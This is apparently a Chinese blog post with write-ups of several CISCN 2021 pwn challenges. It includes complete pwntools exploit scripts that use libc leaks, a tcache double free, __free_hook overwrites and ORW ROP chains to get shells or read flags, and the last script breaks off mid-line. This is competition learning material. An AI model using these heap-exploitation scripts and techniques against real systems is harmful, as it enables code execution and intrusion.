  </entry>
  
  <entry>
    <title>2021Ciscn_wp</title>
    <link href="http://example.com/2021/06/05/2021Ciscn-wp/"/>
    <id>http://example.com/2021/06/05/2021Ciscn-wp/</id>
    <published>2021-06-05T12:31:16.000Z</published>
    <updated>2021-06-05T12:35:09.501Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>第一次单独做正式比赛的pwn，比赛时看到题还是挺懵的一道题没做出来，赛后又看了下几道pwn题的wp，写本篇记录下看的那几道pwn题，虽然事后看了wp感觉题的确不算难但是估计明年再自己做还是挺困难。</p><span id="more"></span><h2 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h2><p>这道题虽然分最少但真的不得不说特别考察基础知识和脑洞，思路上拐过了不容易理解的地方现在看还是挺容易理解的，这道题开始没有任何的漏洞，先是result=open(“/dev/urandom”, 0)读取随机数，并且将result放到了bss段上，后面出题人自己写的write和read函数中使用read()函数时都是read((unsigned __int8)byte_202860, &amp;v2, 8uLL)，这样输入的V2就是不可控的，但write函数是这样的：</p><p><img src="/2021/06/05/2021Ciscn-wp/../../../cach/image-20210525154839420.png" alt="image-20210525154839420"></p><p>代码没做注释将就看吧，简单说就是可以自由输入v2做偏移，之后qword_202060[v0]（qword_202060也是bss段上的）可以覆盖result，利用偏移将byte_202860修改为0后write函数就可以输入两次了，第2次输入的v2参数也变得可控，利用这点后面再用read函数泄露bss段上的_IO_2_1_stdin_、_IO_2_1_stdout_、_IO_2_1_stderr随便选一个的地址获得libc地址和stack地址，之后再利用libc上的environ泄露stack地址，最后再通过write函数将onegadget直接写入栈上的返回地址即可getshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">ld_path=&quot;/home/x7/pwn/CISCN/pwny/ld-2.27.so&quot;</span><br><span class="line">libc_path=&quot;/home/x7/pwn/CISCN/pwny/libc-2.27.so&quot;</span><br><span class="line">p=process([ld_path,&quot;./pwny&quot;],env=&#123;&quot;LD_PROLOAD&quot;:libc_path&#125;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">libc=ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">#byte_202860-&gt;0</span><br><span class="line">p.sendline(str(2))</span><br><span class="line">p.sendline(str(256))</span><br><span class="line">p.sendline(str(2))</span><br><span class="line">p.sendline(str(256))</span><br><span class="line"></span><br><span class="line">#leak libc</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.send(p64(0xfffffffffffffffa))</span><br><span class="line">p.recvuntil(&#x27;Result: &#x27;)</span><br><span class="line">stdin_addr=p.recv(12)</span><br><span class="line">stdin_addr=int(stdin_addr, 16)</span><br><span class="line">log.success(&#x27;stdin_addr: &#x27;+hex(stdin_addr))</span><br><span class="line">libc_base=stdin_addr-libc.sym[&#x27;_IO_2_1_stdin_&#x27;]</span><br><span class="line">log.success(&#x27;libc base: &#x27;+hex(libc_base))</span><br><span class="line"></span><br><span class="line">#leak stack</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.sendline(p64(0xfffffffffffffff5))</span><br><span class="line">p.recvuntil(&#x27;Result: &#x27;)</span><br><span class="line">stack_base=p.recv(12)</span><br><span class="line">stack_base=int(stack_base,16)-0x202008</span><br><span class="line">log.success(&#x27;stack_base: &#x27;+hex(stack_base))</span><br><span class="line">offset=libc_base-stack_base</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.send(p64((offset+libc.sym[&#x27;__environ&#x27;]-0x202060)/8))</span><br><span class="line">p.recvuntil(&#x27;Result: &#x27;)</span><br><span class="line">stack_addr=int(&#x27;0x&#x27;+p.recv(12), 16)</span><br><span class="line">ret_addr=stack_addr+0x120</span><br><span class="line">main_ret=(ret_addr-stack_base+0x202060-0x404300)/8</span><br><span class="line"></span><br><span class="line">#ret-&gt;onegadget </span><br><span class="line">p.sendline(&#x27;2&#x27;)</span><br><span class="line">p.sendline(str(main_ret))</span><br><span class="line">onegadget=libc_base+0x10a41c</span><br><span class="line">p.send(p64(onegadget))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="lonelywolf"><a href="#lonelywolf" class="headerlink" title="lonelywolf"></a>lonelywolf</h2><p>这道题应该是所有题中最简单最常规的题了，其实当初最应该能做出来的就是这道但之前一直懒得刷题(估计以后也不会刷题。。。师傅看到又该骂我了hhh)看出来了但没做出来，给了libc是libc2.27，存在一个UAF漏洞，申请chunk时限制了chunk的大小要小于0x78，后面就不能简单的用main_arena+xx直接泄露libc基址了，但是可以先利用tcache的double free泄露heap地址，因为有了uaf漏洞所以tcache的绕过就很简单了，然后通过偏移控制tcache结构将申请的chunk放入unsorted bin中泄露libc，泄露完libc后继续用tcache的double free申请chunk控制free_hook，将free_hook修改为system来getshell。</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">ld_path=&quot;/home/x7/pwn/CISCN/lonelywolf/ld-2.27.so&quot;</span><br><span class="line">libc_path=&quot;/home/x7/pwn/CISCN/lonelywolf/libc-2.27.so&quot;</span><br><span class="line">p=process([ld_path,&quot;./lonelywolf&quot;],env=&#123;&quot;LD_PRELOAD&quot;:libc_path&#125;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def add(id,size):</span><br><span class="line">    p.sendlineafter(&#x27;Your choice: &#x27;,&#x27;1&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;Index: &#x27;,str(id))</span><br><span class="line">    p.sendlineafter(&#x27;Size: &#x27;,str(size))</span><br><span class="line"></span><br><span class="line">def edit(id,content):</span><br><span class="line">    p.sendlineafter(&#x27;Your choice: &#x27;,&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;Index: &#x27;,str(id))</span><br><span class="line">    p.sendlineafter(&#x27;Content: &#x27;,content)</span><br><span class="line"></span><br><span class="line">def show(id):</span><br><span class="line">    p.sendlineafter(&#x27;Your choice: &#x27;,&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;Index: &#x27;,str(id))</span><br><span class="line"></span><br><span class="line">def delete(id):</span><br><span class="line">    p.sendlineafter(&#x27;Your choice: &#x27;,&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(&#x27;Index: &#x27;,str(id))</span><br><span class="line"></span><br><span class="line">#leak heap_addr</span><br><span class="line">add(0,0x78)</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(0)*2)</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">heap_addr=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x250</span><br><span class="line"></span><br><span class="line">#leak libc_addr</span><br><span class="line">edit(0,p64(heap_addr))</span><br><span class="line">add(0,0x78)</span><br><span class="line">add(0,0x78)</span><br><span class="line">edit(0,&#x27;\x00&#x27;*0x20+&#x27;\xff&#x27;*0x8)</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">main_arena=u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_addr=main_arena-3ebca0</span><br><span class="line">free_hook=libc_addr+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">system=libc_addr+libc.symbols[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">#free_hook-&gt;system</span><br><span class="line">add(0,0x78)</span><br><span class="line">edit(0,&#x27;\x00&#x27;*0x40)</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(0)*2)</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(free_hook)+p64(0))</span><br><span class="line">add(0,0x78)</span><br><span class="line">add(0,0x78)</span><br><span class="line">edit(0,p64(system))</span><br><span class="line">add(0,0x18)</span><br><span class="line">edit(0,&quot;/bin/sh\x00&quot;)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h2><p>这道题是上面lonewolf那道题的魔改版，一道堆+沙盒题。本题使用seccomp禁用了execve系统调用，但open、read、write都能正常使用，所以可以构造orw的rop链open(flag)读取flag（read和write可以用libc的方式使用也可以用syscall的方式使用，open只能用syscall的方式使用，因为libc方式使用的open是openat），构造rop链前先泄露libc，泄露方法与lonelywolf类似，获得libc后将free_hook改为setcontext设置上下文去执行rop链读取flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">ld_path=&quot;/home/x7/pwn/CISCN/silverwolf/ld-2.27.so&quot;</span><br><span class="line">libc_path=&quot;/home/x7/pwn/CISCN/silverwolf/libc-2.27.so&quot;</span><br><span class="line">p=process([ld_path,&quot;./silverwolf&quot;],env=&#123;&quot;LD_PRELOAD&quot;:libc_path&#125;)</span><br><span class="line">libc = ELF(&quot;./libc-2.27.so&quot;)</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def menu(ch):</span><br><span class="line">    p.sendlineafter(&#x27;choice:&#x27;,str(ch))</span><br><span class="line">def add(size):</span><br><span class="line">    menu(1)</span><br><span class="line">    p.sendlineafter(&#x27;Index:&#x27;,str(0))</span><br><span class="line">    p.sendlineafter(&#x27;Size:&#x27;,str(size))</span><br><span class="line">def edit(content):</span><br><span class="line">    menu(2)</span><br><span class="line">    p.sendlineafter(&#x27;Index:&#x27;,str(0))</span><br><span class="line">    p.sendlineafter(&#x27;Content:&#x27;,content)</span><br><span class="line">def show():</span><br><span class="line">    menu(3)</span><br><span class="line">    p.sendlineafter(&#x27;Index:&#x27;,str(0))</span><br><span class="line">def free():</span><br><span class="line">    menu(4)</span><br><span class="line">    p.sendlineafter(&#x27;Index:&#x27;,str(0))</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x78)</span><br><span class="line">    edit(&#x27;./flag\x00&#x27;)</span><br><span class="line">    </span><br><span class="line">for i in range(2):</span><br><span class="line">    edit(&#x27;\x00&#x27;*0x10)</span><br><span class="line">    free()</span><br><span class="line">    </span><br><span class="line">show()</span><br><span class="line">p.recvuntil(&#x27;Content: &#x27;)</span><br><span class="line">heap_base = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))  - 0x5B0 - 0x940 - 0x70</span><br><span class="line">log.info(&#x27;HEAP:\t&#x27; + hex(heap_base))</span><br><span class="line">edit(p64(heap_base + 0x10))</span><br><span class="line">add(0x78)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(&#x27;\x00&#x27;*0x23 + &#x27;\x07&#x27;)</span><br><span class="line">#pause()</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recvuntil(&#x27;\x7F&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;)) - libc.sym[&#x27;__malloc_hook&#x27;] - 0x70</span><br><span class="line">log.info(&#x27;LIBC:\t&#x27; + hex(libc_base))</span><br><span class="line"></span><br><span class="line">edit(&#x27;\x03&#x27;*0x40 + p64(libc_base + libc.sym[&#x27;__free_hook&#x27;]) + &#x27;\x00&#x27;*8*1 + p64(heap_base + 0x4000) + p64(heap_base + 0x3000 + 0x60) + p64(heap_base + 0x1000) + p64(heap_base + 0x10A0) + p64(heap_base + 0x3000))</span><br><span class="line">#pause()</span><br><span class="line">add(0x18)</span><br><span class="line">                                                                              </span><br><span class="line">pop_rdi_ret = libc_base + 0x00000000000215BF</span><br><span class="line">pop_rdx_ret = libc_base + 0x0000000000001B96</span><br><span class="line">pop_rax_ret = libc_base + 0x0000000000043AE8</span><br><span class="line">pop_rsi_ret = libc_base + 0x0000000000023EEA</span><br><span class="line">ret = libc_base + 0x00000000000008AA</span><br><span class="line">#pop_rax_ret=0x43a78 + libc_base</span><br><span class="line">#pop_rdx_rsi=0x130889 + libc_base</span><br><span class="line">#pop_rdi_ret=0x2155f + libc_base</span><br><span class="line">#pop_rsi_ret=0x23e8a + libc_base</span><br><span class="line">#pop_rdx_ret=0x1b96 + libc_base</span><br><span class="line"></span><br><span class="line">Open = libc_base + libc.sym[&#x27;open&#x27;]</span><br><span class="line">Read = libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">Write = libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line">syscall = Read + 15</span><br><span class="line">FLAG  = heap_base + 0x4000</span><br><span class="line">gadget = libc_base + libc.sym[&#x27;setcontext&#x27;] + 53</span><br><span class="line"></span><br><span class="line">orw  = p64(pop_rdi_ret) + p64(FLAG)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(0)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(2)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(3)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_base  + 0x3000)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(0x30)</span><br><span class="line">orw += p64(Read)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(1)</span><br><span class="line">orw += p64(Write)</span><br><span class="line"></span><br><span class="line">edit(p64(gadget))</span><br><span class="line">add(0x38)</span><br><span class="line">edit(&#x27;./flag\x00&#x27;)</span><br><span class="line">add(0x78)</span><br><span class="line">edit(orw[:0x60])</span><br><span class="line">add(0x48)</span><br><span class="line">edit(orw[0x60:])</span><br><span class="line">add(0x68)</span><br><span class="line">edit(p64(heap_base + 0x3000) + p64(pop_rdi_ret + 1))</span><br><span class="line">add(0x58)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>后面的3个题还没看，先记录下来exp以后有时间再看，每次不打比赛不知道自己最菜。。。。。。。</p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line">def RUN(payload):</span><br><span class="line">    p.sendlineafter(&#x27;cmd&gt; &#x27;,str(payload))</span><br><span class="line"></span><br><span class="line">def init(L,W):</span><br><span class="line">    RUN( &#x27;OP:&#x27; + &#x27;1&#x27; + &#x27;\n&#x27; + &#x27;L:&#x27; + str(L) + &#x27;\n&#x27; +  &#x27;W:&#x27; + str(W) + &#x27;\n&#x27;)</span><br><span class="line">def create(ID,Size,des):</span><br><span class="line">    RUN( &#x27;OP:&#x27; + &#x27;2&#x27; + &#x27;\n&#x27; + &#x27;ID:&#x27; + str(ID) + &#x27;\n&#x27; +  &#x27;s:&#x27; + str(Size) + &#x27;\n&#x27;)</span><br><span class="line">    p.sendafter(&#x27;desc&gt; &#x27;,des)</span><br><span class="line">def free(ID):</span><br><span class="line">    RUN( &#x27;OP:&#x27; + &#x27;3&#x27; + &#x27;\n&#x27; + &#x27;ID:&#x27; + str(ID) + &#x27;\n&#x27;)</span><br><span class="line">def show():</span><br><span class="line">    RUN( &#x27;OP:&#x27; + &#x27;4&#x27; + &#x27;\n&#x27;)</span><br><span class="line">def up(ID):</span><br><span class="line">    RUN( &#x27;OP:&#x27; + &#x27;5&#x27; + &#x27;\n&#x27; + &#x27;ID:&#x27; + str(ID) + &#x27;\n&#x27;)</span><br><span class="line">def down(ID):</span><br><span class="line">    RUN( &#x27;OP:&#x27; + &#x27;6&#x27; + &#x27;\n&#x27; + &#x27;ID:&#x27; + str(ID) + &#x27;\n&#x27;)</span><br><span class="line">def left(ID):</span><br><span class="line">    RUN( &#x27;OP:&#x27; + &#x27;7&#x27; + &#x27;\n&#x27; + &#x27;ID:&#x27; + str(ID) + &#x27;\n&#x27;)</span><br><span class="line">def right(ID):</span><br><span class="line">    RUN( &#x27;OP:&#x27; + &#x27;8&#x27; + &#x27;\n&#x27; + &#x27;ID:&#x27; + str(ID) + &#x27;\n&#x27;)</span><br><span class="line">p = process(&#x27;./main&#x27;)</span><br><span class="line">p = remote(&#x27;124.70.35.238&#x27;,23772)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line">init(0x10,0x10)</span><br><span class="line">create(0x6,0x3F0,&#x27;FMYY&#x27;)</span><br><span class="line">right(0x6)</span><br><span class="line">right(0x6)</span><br><span class="line">for i in range(10):</span><br><span class="line">    down(0x6)</span><br><span class="line">create(0x99,0x3F0,&#x27;\x00&#x27;*0x1F8 + p64(0x201))</span><br><span class="line">free(0x6)</span><br><span class="line">create(1,0x380,&#x27;\xA0&#x27;)</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recvuntil(&#x27;\x7F&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;)) - libc.sym[&#x27;__malloc_hook&#x27;] - 0x70 - 0x500</span><br><span class="line">log.info(&#x27;LIBC:\t&#x27; + hex(libc_base))</span><br><span class="line"></span><br><span class="line">create(9,0x10,&#x27;\xA0&#x27;)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;9: (10,12) &#x27;)</span><br><span class="line">heap_base = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;)) - 0xDA0  - 0x1400 + 0x400</span><br><span class="line">log.info(&#x27;HEAP:\t&#x27; + hex(heap_base))</span><br><span class="line"></span><br><span class="line">free(0x99)</span><br><span class="line">create(2,0x230,&#x27;\x00&#x27;*0x38 + p64(0x401) + p64(heap_base + 0x10))</span><br><span class="line"></span><br><span class="line">###################</span><br><span class="line">pop_rdi_ret = libc_base + 0x000000000002155f</span><br><span class="line">pop_rdx_ret = libc_base + 0x0000000000001b96</span><br><span class="line">pop_rax_ret = libc_base + 0x0000000000043a78</span><br><span class="line">pop_rsi_ret = libc_base + 0x0000000000023e8a</span><br><span class="line">ret = libc_base + 0x00000000000008AA</span><br><span class="line">Open = libc_base + libc.sym[&#x27;open&#x27;]</span><br><span class="line">Read = libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">Write = libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line">syscall = Read + 15</span><br><span class="line">FLAG  = heap_base + 0x10 + 0xA0 + 0x10 + 0x88</span><br><span class="line"></span><br><span class="line">orw  = p64(pop_rdi_ret) + p64(FLAG)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(0)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(2)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(3)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_base  + 0x3000)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(0x30)</span><br><span class="line">orw += p64(Read)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(1)</span><br><span class="line">orw += p64(Write)</span><br><span class="line">###################</span><br><span class="line">create(7,0x3F0,&#x27;FMYY&#x27;)</span><br><span class="line">create(8,0x3F0,&#x27;\x00&#x27;*7 + &#x27;\x01&#x27; + &#x27;\x00&#x27;*0x38 +&#x27;\x00&#x27;*8*7 + p64(libc_base + libc.sym[&#x27;__free_hook&#x27;])  + &#x27;\x00&#x27;*0x20 + p64(heap_base + 0x10 + 0xA0 + 0x10) + p64(pop_rdi_ret + 1) + orw + &#x27;./flag\x00&#x27;)</span><br><span class="line"></span><br><span class="line">create(3,0x80,p64(libc_base + libc.sym[&#x27;setcontext&#x27;] + 53))</span><br><span class="line"></span><br><span class="line">free(8)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line">def menu(ch):</span><br><span class="line">    p.sendlineafter(&#x27;&gt; &#x27;,str(ch))</span><br><span class="line">def Register(key):</span><br><span class="line">    menu(1)</span><br><span class="line">    p.sendafter(&#x27;key&gt; \n&#x27;,key)</span><br><span class="line">def UnRegister(key):</span><br><span class="line">    menu(2)</span><br><span class="line">    p.sendafter(&#x27;key&gt; \n&#x27;,key)</span><br><span class="line">def Read(key):</span><br><span class="line">    menu(3)</span><br><span class="line">    p.sendafter(&#x27;key&gt; \n&#x27;,key)</span><br><span class="line">def Write(key,len,content):</span><br><span class="line">    menu(4)</span><br><span class="line">    p.sendafter(&#x27;key&gt;&#x27;,key)</span><br><span class="line">    p.sendlineafter(&#x27;len&gt;&#x27;,str(len))</span><br><span class="line">    p.sendafter(&#x27;content&gt;&#x27;,content)</span><br><span class="line">#p = process(&#x27;./qemu-aarch64-static -g 4444 -L $(pwd)/LIB ./main&#x27;,shell=True)</span><br><span class="line">p = remote(&#x27;124.70.35.238&#x27;,23680)</span><br><span class="line"></span><br><span class="line">libc = ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line"></span><br><span class="line">Register(&#x27;fmyy&#x27;)</span><br><span class="line">Register(&#x27;FMYY&#x27;)</span><br><span class="line">Register(&#x27;TMP&#x27;)</span><br><span class="line">Register(&#x27;0&#x27;)</span><br><span class="line">Register(&#x27;1&#x27;)</span><br><span class="line">Register(&#x27;2&#x27;)</span><br><span class="line">Register(&#x27;3&#x27;)</span><br><span class="line">Register(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">UnRegister(&#x27;fmyy&#x27;)</span><br><span class="line">UnRegister(&#x27;FMYY&#x27;)</span><br><span class="line">Write(&#x27;TMP&#x27;,0x110,&#x27;\xF0&#x27;)</span><br><span class="line">Read(&#x27;TMP&#x27;)</span><br><span class="line">heap_base = (u32(p.recv(3).ljust(4,&#x27;\x00&#x27;)) | 0x0000004000000000) - 0x2F0</span><br><span class="line">log.info(&#x27;HEAP:\t&#x27; + hex(heap_base))</span><br><span class="line"></span><br><span class="line">Write(&#x27;TMP&#x27;,0x110,&#x27;\x00&#x27;*0xF8 + p64(0x4A1) + p64(heap_base + 0x3A0 )) 